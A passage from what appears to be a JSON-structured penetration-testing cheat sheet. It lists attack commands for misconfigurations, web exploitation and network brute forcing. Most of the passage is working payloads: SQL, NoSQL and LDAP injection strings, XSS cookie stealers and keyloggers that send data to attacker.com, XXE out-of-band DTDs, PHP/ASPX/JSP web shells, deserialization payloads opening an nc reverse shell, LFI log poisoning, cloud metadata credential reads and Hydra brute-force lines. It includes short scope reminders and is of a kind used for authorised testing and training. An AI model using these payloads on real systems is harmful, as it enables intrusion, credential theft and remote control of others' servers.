                            "descriptionMd": "### Misconfiguration Analysis\nExploits aren't always about complex code vulnerabilities. Often the easiest path to compromise is through simple configuration errors that expose systems or data.\n\n**Critical Misconfigurations:**\n* **CORS (Cross-Origin Resource Sharing):** Overly permissive policies allowing arbitrary origins to access sensitive APIs\n* **Security Headers:** Missing CSP, HSTS, X-Frame-Options, X-Content-Type-Options\n* **Cloud Storage:** Publicly readable/writable S3 buckets, Azure Blobs, GCP buckets\n* **Directory Listing:** Exposed `/uploads/`, `/backup/`, `/logs/` directories\n* **Default Credentials:** Admin panels with `admin:admin`, `root:root`, or vendor defaults\n* **Debug/Development Features:** Enabled stack traces, verbose errors, debug consoles\n* **Subdomain Takeover:** DNS pointing to unclaimed services (AWS, GitHub Pages, Heroku)\n* **HTTP Methods:** Dangerous methods enabled (PUT, DELETE, TRACE)\n* **Server Information Disclosure:** Detailed version banners, error messages\n* **Backup Files:** Exposed `.bak`, `.old`, `.backup`, `.git` directories\n\n**Common Cloud Misconfigurations:**\n* S3 bucket ACLs set to public-read or public-read-write\n* IAM roles with overly permissive policies\n* Security groups allowing 0.0.0.0/0 access\n* Unencrypted storage volumes or databases\n* Exposed metadata endpoints (169.254.169.254)",
                            "commands": [{
                                    "description": "TestSSL (TLS/Cert/Headers)",
                                    "code": "testssl.sh --fast --headers https://target.com"
                                },
                                {
                                    "description": "TestSSL (Full Scan)",
                                    "code": "testssl.sh --full --jsonfile results.json https://target.com"
                                },
                                {
                                    "description": "CORS Misconfiguration Test",
                                    "code": "curl -I -H \"Origin: https://evil.com\" https://target.com/api/data"
                                },
                                {
                                    "description": "Security Headers Check",
                                    "code": "curl -I https://target.com | grep -E 'X-Frame-Options|Strict-Transport|Content-Security|X-Content-Type'"
                                },
                                {
                                    "description": "HTTP Methods Test",
                                    "code": "curl -X OPTIONS -I https://target.com"
                                },
                                {
                                    "description": "Subdomain Takeover (Subjack)",
                                    "code": "subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c fingerprints.json -v 3"
                                },
                                {
                                    "description": "S3 Bucket Enumeration",
                                    "code": "aws s3 ls s3://bucket-name --no-sign-request --region us-east-1"
                                },
                                {
                                    "description": "S3 Bucket Upload Test",
                                    "code": "echo 'test' > test.txt && aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request"
                                },
                                {
                                    "description": "S3 Bucket Permissions Check",
                                    "code": "aws s3api get-bucket-acl --bucket bucket-name --no-sign-request"
                                },
                                {
                                    "description": "Directory Listing Check",
                                    "code": "curl -s https://target.com/uploads/ | grep -i 'Index of'"
                                },
                                {
                                    "description": "Git Repository Exposure",
                                    "code": "curl -s https://target.com/.git/config"
                                },
                                {
                                    "description": "Nmap HTTP Methods",
                                    "code": "nmap -p80,443 --script http-methods target.com"
                                },
                                {
                                    "description": "Cloud Metadata Endpoint",
                                    "code": "curl http://169.254.169.254/latest/meta-data/"
                                }
                            ],
                            "type": "technique",
                            "emoji": "⚙️",
                            "resources": [{
                                    "title": "Security Headers Scanner",
                                    "url": "https://securityheaders.com/"
                                },
                                {
                                    "title": "Mozilla Observatory",
                                    "url": "https://observatory.mozilla.org/"
                                },
                                {
                                    "title": "OWASP Secure Headers Project",
                                    "url": "https://owasp.org/www-project-secure-headers/"
                                },
                                {
                                    "title": "AWS S3 Security Best Practices",
                                    "url": "https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html"
                                },
                                {
                                    "title": "Cloud Security Checklist",
                                    "url": "https://github.com/toniblyx/my-arsenal-of-aws-security-tools"
                                }
                            ]
                        },
                        "children": []
                    }
                ]
            },

            {
                "id": "exploitation",
                "data": {
                    "label": "Exploitation",
                    "description": "Gaining Access",
                    "descriptionMd": "### Exploitation\nThis is the pivot from *identifying* a potential vulnerability to *proving* it allows unauthorized access or control. \n\n**Rules of Engagement:**\n* Always verify if exploitation is permitted in the scope.\n* Avoid destructive payloads (e.g., `DROP TABLE`) on production systems.\n* Document every step for the final report.\n* Maintain detailed logs with timestamps.\n* Have a rollback plan for each action.",
                    "commands": [],
                    "type": "category",
                    "emoji": "⚔️",
                    "resources": [{
                            "title": "Metasploit Unleashed",
                            "url": "https://www.offsec.com/metasploit-unleashed/"
                        },
                        {
                            "title": "PortSwigger Web Security Academy",
                            "url": "https://portswigger.net/web-security"
                        },
                        {
                            "title": "OWASP Testing Guide",
                            "url": "https://owasp.org/www-project-web-security-testing-guide/"
                        },
                        {
                            "title": "HackTricks",
                            "url": "https://book.hacktricks.xyz/"
                        }
                    ]
                },
                "children": [{
                        "id": "web-exploit",
                        "data": {
                            "label": "Web Exploitation",
                            "description": "OWASP Top 10 & More",
                            "descriptionMd": "### Web Exploitation\nTargeting application-layer logic errors and input validation failures. Modern web apps have complex attack surfaces including APIs, WebSockets, and client-side frameworks.",
                            "commands": [],
                            "type": "category",
                            "emoji": "🌐",
                            "resources": [{
                                "title": "OWASP Top 10",
                                "url": "https://owasp.org/www-project-top-ten/"
                            }]
                        },
                        "children": [{
                                "id": "injection",
                                "data": {
                                    "label": "Injection",
                                    "description": "SQLi / Command / NoSQL",
                                    "descriptionMd": "### Injection\nForcing the application to interpret data as code.\n* **SQLi:** Dump databases or bypass logins.\n* **Command Injection:** Execute OS commands.\n* **NoSQL Injection:** Bypass authentication in MongoDB, etc.\n* **LDAP Injection:** Manipulate directory queries.",
                                    "commands": [{
                                            "description": "SQLMap (Request File)",
                                            "code": "sqlmap -r request.txt --batch --dbs --threads=10"
                                        },
                                        {
                                            "description": "SQLMap (Specific DB Dump)",
                                            "code": "sqlmap -r request.txt -D database_name --dump"
                                        },
                                        {
                                            "description": "Manual Login Bypass",
                                            "code": "admin' OR 1=1 -- //"
                                        },
                                        {
                                            "description": "Manual Union-Based SQLi",
                                            "code": "' UNION SELECT NULL,NULL,NULL--"
                                        },
                                        {
                                            "description": "Time-Based Blind SQLi",
                                            "code": "' AND SLEEP(5)--"
                                        },
                                        {
                                            "description": "Error-Based SQLi (MySQL)",
                                            "code": "' AND extractvalue(1,concat(0x7e,version()))--"
                                        },
                                        {
                                            "description": "Command Injection (Blind)",
                                            "code": "ping -c 4 10.10.14.5"
                                        },
                                        {
                                            "description": "Command Injection (Concatenation)",
                                            "code": "; cat /etc/passwd"
                                        },
                                        {
                                            "description": "Command Injection (Backticks)",
                                            "code": "`whoami`"
                                        },
                                        {
                                            "description": "NoSQL Injection (MongoDB)",
                                            "code": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}"
                                        },
                                        {
                                            "description": "NoSQL Regex Bypass",
                                            "code": "{\"username\": {\"$regex\": \"^admin\"}, \"password\": {\"$regex\": \".*\"}}"
                                        },
                                        {
                                            "description": "LDAP Injection (Bypass)",
                                            "code": "*)(uid=*))(|(uid=*"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🗄️",
                                    "resources": [{
                                            "title": "SQL Injection Cheat Sheet",
                                            "url": "https://portswigger.net/web-security/sql-injection/cheat-sheet"
                                        },
                                        {
                                            "title": "PayloadsAllTheThings - SQLi",
                                            "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
                                        },
                                        {
                                            "title": "NoSQL Injection",
                                            "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "xss",
                                "data": {
                                    "label": "XSS",
                                    "description": "Cross-Site Scripting",
                                    "descriptionMd": "### Cross-Site Scripting (XSS)\nExecuting arbitrary JavaScript in the victim's browser.\n* **Reflected:** In the URL, immediate execution.\n* **Stored:** In the database (comments, profiles), persistent.\n* **DOM:** In client-side logic, no server interaction.\n* **Blind:** Triggers in admin panel or logs.",
                                    "commands": [{
                                            "description": "Basic Proof",
                                            "code": "<script>alert(document.domain)</script>"
                                        },
                                        {
                                            "description": "SVG Payload (Bypass)",
                                            "code": "<svg/onload=alert(1)>"
                                        },
                                        {
                                            "description": "IMG Tag Payload",
                                            "code": "<img src=x onerror=alert(1)>"
                                        },
                                        {
                                            "description": "Cookie Stealer",
                                            "code": "<script>fetch('https://attacker.com/log?c='+document.cookie)</script>"
                                        },
                                        {
                                            "description": "Keylogger",
                                            "code": "<script>document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key)}</script>"
                                        },
                                        {
                                            "description": "Beef Hook",
                                            "code": "<script src=\"http://attacker.com:3000/hook.js\"></script>"
                                        },
                                        {
                                            "description": "AngularJS Bypass",
                                            "code": "{{constructor.constructor('alert(1)')()}}"
                                        },
                                        {
                                            "description": "CSP Bypass (JSONP)",
                                            "code": "<script src=\"https://vulnerable-site.com/jsonp?callback=alert\"></script>"
                                        },
                                        {
                                            "description": "DOM XSS Example",
                                            "code": "javascript:eval(location.hash.slice(1))"
                                        },
                                        {
                                            "description": "Polyglot Payload",
                                            "code": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "💻",
                                    "resources": [{
                                            "title": "XSS Filter Evasion Cheat Sheet",
                                            "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
                                        },
                                        {
                                            "title": "PayloadsAllTheThings - XSS",
                                            "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "csrf",
                                "data": {
                                    "label": "CSRF",
                                    "description": "Cross-Site Request Forgery",
                                    "descriptionMd": "### CSRF\nForcing authenticated users to perform unintended actions.\n* Requires victim to be logged in.\n* Exploits missing or weak anti-CSRF tokens.\n* Can be combined with XSS for maximum impact.",
                                    "commands": [{
                                            "description": "Basic HTML Form",
                                            "code": "<form action=\"https://target.com/changePassword\" method=\"POST\"><input name=\"newpass\" value=\"hacked123\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>"
                                        },
                                        {
                                            "description": "IMG Tag (GET Request)",
                                            "code": "<img src=\"https://target.com/api/delete?id=123\">"
                                        },
                                        {
                                            "description": "AJAX with Credentials",
                                            "code": "<script>fetch('https://target.com/api/transfer',{method:'POST',credentials:'include',body:'amount=1000&to=attacker'})</script>"
                                        },
                                        {
                                            "description": "JSON CSRF",
                                            "code": "<script>fetch('https://api.target.com/update',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({role:'admin'})})</script>"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🔄",
                                    "resources": [{
                                        "title": "OWASP CSRF",
                                        "url": "https://owasp.org/www-community/attacks/csrf"
                                    }]
                                },
                                "children": []
                            },
                            {
                                "id": "ssrf",
                                "data": {
                                    "label": "SSRF",
                                    "description": "Server Side Request Forgery",
                                    "descriptionMd": "### SSRF\nTricking the server into making requests on your behalf to internal resources or cloud metadata services.\n* **Blind SSRF:** No response returned, use out-of-band techniques.\n* **Semi-Blind:** Time-based or error-based detection.\n* **Full:** Complete response returned.",
                                    "commands": [{
                                            "description": "Localhost Port Scan",
                                            "code": "GET /?url=http://127.0.0.1:22 HTTP/1.1"
                                        },
                                        {
                                            "description": "Internal Network Scan",
                                            "code": "http://192.168.1.1:80"
                                        },
                                        {
                                            "description": "AWS Metadata",
                                            "code": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                                        },
                                        {
                                            "description": "AWS IMDSv2 (Token Required)",
                                            "code": "TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`; curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/"
                                        },
                                        {
                                            "description": "GCP Metadata",
                                            "code": "http://metadata.google.internal/computeMetadata/v1/?recursive=true (Header: Metadata-Flavor: Google)"
                                        },
                                        {
                                            "description": "Azure Metadata",
                                            "code": "http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Header: Metadata:true)"
                                        },
                                        {
                                            "description": "Bypass Localhost Filter",
                                            "code": "http://127.0.0.1 → http://localhost → http://0.0.0.0 → http://[::1] → http://2130706433"
                                        },
                                        {
                                            "description": "DNS Rebinding",
                                            "code": "http://rebind.network/attack"
                                        },
                                        {
                                            "description": "File Protocol",
                                            "code": "file:///etc/passwd"
                                        },
                                        {
                                            "description": "Blind SSRF (Burp Collab)",
                                            "code": "http://burpcollaborator.net"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🖥️",
                                    "resources": [{
                                            "title": "SSRF Bible",
                                            "url": "https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery"
                                        },
                                        {
                                            "title": "PayloadsAllTheThings - SSRF",
                                            "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "idor",
                                "data": {
                                    "label": "IDOR",
                                    "description": "Insecure Direct Object Reference",
                                    "descriptionMd": "### IDOR\nAccessing data belonging to other users by changing an ID parameter (e.g., `user_id=100` to `user_id=101`).\n* Common in REST APIs.\n* Look for numeric IDs, UUIDs, encoded values.\n* Test both GET and POST parameters.\n* Check for mass assignment vulnerabilities.",
                                    "commands": [{
                                            "description": "Burp Intruder (Numeric)",
                                            "code": "Capture request -> Send to Intruder -> Payload: Numbers 1-1000 on 'id' parameter"
                                        },
                                        {
                                            "description": "UUID Guessing",
                                            "code": "Check if UUIDs are leaked in other API responses"
                                        },
                                        {
                                            "description": "Base64 Decode IDs",
                                            "code": "echo 'dXNlcmlkPTEyMw==' | base64 -d"
                                        },
                                        {
                                            "description": "Parameter Pollution",
                                            "code": "GET /api/user?id=123&id=456"
                                        },
                                        {
                                            "description": "Wildcard Testing",
                                            "code": "GET /api/users/* or /api/users/all"
                                        },
                                        {
                                            "description": "GUID Enumeration",
                                            "code": "ffuf -u https://target.com/api/docs/FUZZ -w guids.txt"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "👤",
                                    "resources": [{
                                        "title": "IDOR Techniques",
                                        "url": "https://book.hacktricks.xyz/pentesting-web/idor"
                                    }]
                                },
                                "children": []
                            },
                            {
                                "id": "lfi-path",
                                "data": {
                                    "label": "LFI / Path Traversal",
                                    "description": "File reads & include flows",
                                    "descriptionMd": "### Local File Inclusion (LFI)\nReading local files on the server, often via dynamic file loading.\n* Can lead to RCE via log poisoning.\n* PHP wrappers provide powerful capabilities.\n* Check for file upload + LFI = RCE.",
                                    "commands": [{
                                            "description": "Basic Traversal",
                                            "code": "../../../../etc/passwd"
                                        },
                                        {
                                            "description": "Deep Traversal",
                                            "code": "../../../../../../../etc/passwd"
                                        },
                                        {
                                            "description": "PHP Filter Wrapper (Source Code)",
                                            "code": "php://filter/convert.base64-encode/resource=index.php"
                                        },
                                        {
                                            "description": "PHP Input Wrapper (RCE)",
                                            "code": "php://input (POST body: <?php system($_GET['cmd']); ?>)"
                                        },
                                        {
                                            "description": "Data Wrapper (RCE)",
                                            "code": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
                                        },
                                        {
                                            "description": "Expect Wrapper (RCE)",
                                            "code": "expect://id"
                                        },
                                        {
                                            "description": "Null Byte (Legacy PHP < 5.3)",
                                            "code": "../../../etc/passwd%00"
                                        },
                                        {
                                            "description": "Windows - Boot.ini",
                                            "code": "..\\..\\..\\..\\boot.ini"
                                        },
                                        {
                                            "description": "Windows - SAM File",
                                            "code": "..\\..\\..\\..\\windows\\system32\\config\\sam"
                                        },
                                        {
                                            "description": "Log Poisoning (Apache)",
                                            "code": "/../../../var/log/apache2/access.log (inject PHP in User-Agent)"
                                        },
                                        {
                                            "description": "Log Poisoning (SSH)",
                                            "code": "/../../../var/log/auth.log (SSH with payload: <?php system($_GET['c']); ?>)"
                                        },
                                        {
                                            "description": "Proc Self Environ",
                                            "code": "/proc/self/environ (inject PHP in User-Agent)"
                                        },
                                        {
                                            "description": "ZIP Wrapper",
                                            "code": "zip://archive.zip#shell.php"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🧵",
                                    "resources": [{
                                            "title": "LFI Cheat Sheet",
                                            "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion"
                                        },
                                        {
                                            "title": "PHP Filter Tricks",
                                            "url": "https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "xxe",
                                "data": {
                                    "label": "XXE",
                                    "description": "XML External Entities",
                                    "descriptionMd": "### XXE\nAbusing XML parsers to read local files or perform SSRF.\n* Look for file upload accepting XML, DOCX, SVG.\n* SOAP endpoints are common targets.\n* Can be blind - use OOB techniques.",
                                    "commands": [{
                                            "description": "Basic Payload",
                                            "code": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>"
                                        },
                                        {
                                            "description": "Parameter Entity",
                                            "code": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]>"
                                        },
                                        {
                                            "description": "Blind XXE (OOB)",
                                            "code": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;]>"
                                        },
                                        {
                                            "description": "XXE via SSRF",
                                            "code": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"
                                        },
                                        {
                                            "description": "Base64 Exfil",
                                            "code": "<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;"
                                        },
                                        {
                                            "description": "Windows File",
                                            "code": "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">"
                                        },
                                        {
                                            "description": "PHP Expect",
                                            "code": "<!ENTITY xxe SYSTEM \"expect://id\">"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🧾",
                                    "resources": [{
                                            "title": "XXE Cheat Sheet",
                                            "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"
                                        },
                                        {
                                            "title": "PortSwigger XXE",
                                            "url": "https://portswigger.net/web-security/xxe"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "file-upload",
                                "data": {
                                    "label": "File Upload",
                                    "description": "Shell upload & RCE",
                                    "descriptionMd": "### Malicious File Upload\nUploading a web shell to execute commands.\n* Bypass extension filters.\n* Bypass content-type checks.\n* Bypass magic bytes validation.\n* Find upload directory path.",
                                    "commands": [{
                                            "description": "Extension Bypass",
                                            "code": "shell.php.jpg or shell.php5 or shell.phtml or shell.phps"
                                        },
                                        {
                                            "description": "Double Extension",
                                            "code": "shell.jpg.php"
                                        },
                                        {
                                            "description": "Magic Bytes",
                                            "code": "Add 'GIF89a;' to the top of the PHP file to mimic an image"
                                        },
                                        {
                                            "description": "Null Byte",
                                            "code": "shell.php%00.jpg"
                                        },
                                        {
                                            "description": "MIME Type Bypass",
                                            "code": "Content-Type: image/jpeg (but upload PHP)"
                                        },
                                        {
                                            "description": "Simple PHP Shell",
                                            "code": "<?php system($_GET['cmd']); ?>"
                                        },
                                        {
                                            "description": "P0wny Shell",
                                            "code": "wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php"
                                        },
                                        {
                                            "description": "Weevely (Obfuscated)",
                                            "code": "weevely generate password /path/shell.php"
                                        },
                                        {
                                            "description": "Polyglot (GIF+PHP)",
                                            "code": "GIF89a; <?php system($_GET['c']); ?>"
                                        },
                                        {
                                            "description": "ASPX Shell",
                                            "code": "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"c\"]);%>"
                                        },
                                        {
                                            "description": "JSP Shell",
                                            "code": "<%Runtime.getRuntime().exec(request.getParameter(\"c\"));%>"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "📤",
                                    "resources": [{
                                            "title": "File Upload Attacks",
                                            "url": "https://book.hacktricks.xyz/pentesting-web/file-upload"
                                        },
                                        {
                                            "title": "Web Shells Collection",
                                            "url": "https://github.com/tennc/webshell"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "deserialization",
                                "data": {
                                    "label": "Deserialization",
                                    "description": "Object injection & RCE",
                                    "descriptionMd": "### Insecure Deserialization\nExploiting unsafe deserialization of objects to achieve RCE.\n* Common in Java, PHP, Python, Ruby.\n* Look for serialized data in cookies, parameters.\n* Often leads to direct RCE.",
                                    "commands": [{
                                            "description": "PHP Object Injection",
                                            "code": "O:8:\"UserData\":1:{s:8:\"isAdmin\";b:1;}"
                                        },
                                        {
                                            "description": "Java - ysoserial",
                                            "code": "java -jar ysoserial.jar CommonsCollections6 'nc 10.10.14.5 9001 -e /bin/sh' | base64"
                                        },
                                        {
                                            "description": "Python Pickle",
                                            "code": "import pickle; import os; class RCE: def __reduce__(self): return (os.system, ('nc 10.10.14.5 9001 -e /bin/sh',)); pickle.dumps(RCE())"
                                        },
                                        {
                                            "description": ".NET - ysoserial.net",
                                            "code": "ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c \"calc.exe\""
                                        },
                                        {
                                            "description": "Ruby Marshal",
                                            "code": "require 'marshal'; Marshal.load(payload)"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "📦",
                                    "resources": [{
                                            "title": "ysoserial",
                                            "url": "https://github.com/frohoff/ysoserial"
                                        },
                                        {
                                            "title": "Deserialization Cheat Sheet",
                                            "url": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "ssti",
                                "data": {
                                    "label": "SSTI",
                                    "description": "Server-Side Template Injection",
                                    "descriptionMd": "### Server-Side Template Injection\nInjecting template directives to execute arbitrary code on the server.\n* Common in Jinja2, Twig, Freemarker, Velocity.\n* Test with `{{7*7}}` or `${7*7}`.\n* Can lead to full RCE.",
                                    "commands": [{
                                            "description": "Basic Detection",
                                            "code": "{{7*7}} or ${7*7} or <%= 7*7 %>"
                                        },
                                        {
                                            "description": "Jinja2 RCE",
                                            "code": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
                                        },
                                        {
                                            "description": "Jinja2 Alt RCE",
                                            "code": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
                                        },
                                        {
                                            "description": "Twig RCE",
                                            "code": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
                                        },
                                        {
                                            "description": "Freemarker RCE",
                                            "code": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
                                        },
                                        {
                                            "description": "Velocity RCE",
                                            "code": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
                                        },
                                        {
                                            "description": "ERB (Ruby) RCE",
                                            "code": "<%= system('id') %>"
                                        },
                                        {
                                            "description": "Smarty RCE",
                                            "code": "{system('id')}"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🎭",
                                    "resources": [{
                                            "title": "SSTI PayloadsAllTheThings",
                                            "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
                                        },
                                        {
                                            "title": "HackTricks SSTI",
                                            "url": "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "api-abuse",
                                "data": {
                                    "label": "API Abuse",
                                    "description": "REST/GraphQL exploitation",
                                    "descriptionMd": "### API Security Issues\nModern APIs introduce unique attack vectors.\n* **Mass Assignment:** Modify unintended fields.\n* **Excessive Data Exposure:** APIs return more data than needed.\n* **Rate Limiting:** Missing or weak rate limits.\n* **GraphQL:** Introspection, batching attacks, nested queries.",
                                    "commands": [{
                                            "description": "Mass Assignment",
                                            "code": "{\"username\":\"victim\",\"password\":\"pass123\",\"isAdmin\":true}"
                                        },
                                        {
                                            "description": "GraphQL Introspection",
                                            "code": "{__schema{types{name,fields{name}}}}"
                                        },
                                        {
                                            "description": "GraphQL Batching",
                                            "code": "[{\"query\":\"mutation{...}\"},{\"query\":\"mutation{...}\"}]"
                                        },
                                        {
                                            "description": "API Fuzzing",
                                            "code": "ffuf -u https://api.target.com/v1/FUZZ -w api-endpoints.txt"
                                        },
                                        {
                                            "description": "JWT None Algorithm",
                                            "code": "{'alg':'none'} (remove signature)"
                                        },
                                        {
                                            "description": "JWT Key Confusion",
                                            "code": "Change 'alg' from RS256 to HS256"
                                        },
                                        {
                                            "description": "API Version Testing",
                                            "code": "/api/v1/users vs /api/v2/users vs /api/users"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🔌",
                                    "resources": [{
                                            "title": "OWASP API Security Top 10",
                                            "url": "https://owasp.org/www-project-api-security/"
                                        },
                                        {
                                            "title": "GraphQL Voyager",
                                            "url": "https://github.com/APIs-guru/graphql-voyager"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "auth-bypass",
                                "data": {
                                    "label": "Auth Bypass",
                                    "description": "Authentication & Authorization",
                                    "descriptionMd": "### Authentication/Authorization Bypass\nCircumventing login mechanisms or privilege checks.\n* Default credentials.\n* SQL injection in login.\n* JWT vulnerabilities.\n* Session fixation/hijacking.\n* OAuth misconfigurations.",
                                    "commands": [{
                                            "description": "SQL Auth Bypass",
                                            "code": "admin' OR '1'='1'-- -"
                                        },
                                        {
                                            "description": "Default Credentials",
                                            "code": "admin:admin, admin:password, root:root"
                                        },
                                        {
                                            "description": "JWT Secret Bruteforce",
                                            "code": "hashcat -a 0 -m 16500 jwt.txt wordlist.txt"
                                        },
                                        {
                                            "description": "Session Fixation",
                                            "code": "Set-Cookie: PHPSESSID=attacker_controlled_value"
                                        },
                                        {
                                            "description": "Cookie Tampering",
                                            "code": "Change 'role=user' to 'role=admin' in cookie"
                                        },
                                        {
                                            "description": "Parameter Tampering",
                                            "code": "Change 'user_id=123' to 'user_id=1' (admin)"
                                        },
                                        {
                                            "description": "HTTP Verb Tampering",
                                            "code": "GET /admin (403) → POST /admin (200)"
                                        },
                                        {
                                            "description": "Path Traversal Auth",
                                            "code": "/admin/../../api/user"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🔐",
                                    "resources": [{
                                            "title": "JWT.io",
                                            "url": "https://jwt.io/"
                                        },
                                        {
                                            "title": "Default Credentials",
                                            "url": "https://github.com/ihebski/DefaultCreds-cheat-sheet"
                                        }
                                    ]
                                },
                                "children": []
                            }
                        ]
                    },

                    {
                        "id": "net-exploit",
                        "data": {
                            "label": "Network Exploitation",
                            "description": "Infrastructure Services",
                            "descriptionMd": "### Network Exploitation\nCompromising infrastructure services to gain shell access. Focus on exposed services, misconfigurations, and unpatched vulnerabilities.",
                            "commands": [],
                            "type": "category",
                            "emoji": "🕸️",
                            "resources": [{
                                "title": "Exploit-DB",
                                "url": "https://www.exploit-db.com/"
                            }]
                        },
                        "children": [{
                                "id": "brute",
                                "data": {
                                    "label": "Brute Force",
                                    "description": "Credential Guessing",
                                    "descriptionMd": "### Brute Force\nAttempting to guess credentials. **Warning:** This often locks accounts and creates noise.\n* Always check for account lockout policies first.\n* Use password spraying (one password, many users) to avoid lockouts.\n* Common default credentials should be tried first.",
                                    "commands": [{
                                            "description": "Hydra (SSH)",
                                            "code": "hydra -l root -P rockyou.txt ssh://target_ip"
                                        },
                                        {
                                            "description": "Hydra (RDP)",
                                            "code": "hydra -L users.txt -P passwords.txt rdp://target_ip"
                                        },
                                        {
                                            "description": "Hydra (Post Form)",
                                            "code": "hydra -l admin -P pass.txt target.com http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=failed\""
                                        },
                                        {
                                            "description": "Medusa (SSH)",
                                            "code": "medusa -h target_ip -u root -P rockyou.txt -M ssh"
                                        },
                                        {
                                            "description": "Netexec (SMB)",
                                            "code": "nxc smb target_ip -u users.txt -p passwords.txt"
                                        },
                                        {
                                            "description": "Password Spray (SMB)",
                                            "code": "nxc smb target_ip -u users.txt -p 'Password123!' --continue-on-success"
                                        },
                                        {
                                            "description": "CrackMapExec (WinRM)",
                                            "code": "nxc winrm target_ip -u admin -p passwords.txt"
                                        },
                                        {
                                            "description": "Patator (FTP)",
                                            "code": "patator ftp_login host=target_ip user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg='Login incorrect'"
                                        }
                                    ],
                                    "type": "technique",
                                    "emoji": "🔨",
                                    "resources": [{
                                            "title": "SecLists",
                                            "url": "https://github.com/danielmiessler/SecLists"
                                        },
                                        {
                                            "title": "Default Password List",
                                            "url": "https://github.com/ihebski/DefaultCreds-cheat-sheet"
                                        }
                                    ]
                                },
                                "children": []
                            },
                            {
                                "id": "smb-exploit",
                                "data": {
                                    "label": "SMB Exploitation",
                                    "description": "Windows File Sharing",
